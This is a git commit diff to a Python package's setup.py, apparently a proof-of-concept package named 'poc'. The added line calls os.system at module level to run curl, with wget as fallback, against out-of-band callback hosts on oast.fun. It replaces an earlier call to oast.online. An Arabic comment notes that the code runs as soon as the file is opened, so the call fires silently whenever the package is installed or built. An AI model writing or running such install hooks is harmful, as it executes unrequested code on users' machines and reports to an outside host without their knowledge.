d4502eaa762e9e466196af366f50da878ab8ed44
Abdelrhman Atef <64407840+abdoatef267@users.noreply.github.com>
2025-12-18 23:15:51 +0200

    Update setup.py

--- setup.py
+++ setup.py
@@ -2,7 +2,7 @@ from setuptools import setup, find_packages
 import os
 
 # أول ما الملف يتفتح، الكود ده هيشتغل
-os.system("curl http://python.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online || wget -qO- http://python-wget.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online")
+os.system("curl http://python.d526s3o3t4gglckn7dd07zq887iocppah.oast.fun || wget -qO- http://python-wget.d526s3o3t4gglckn7dd07zq887iocppah.oast.fun")
 
 setup(
     name="poc",
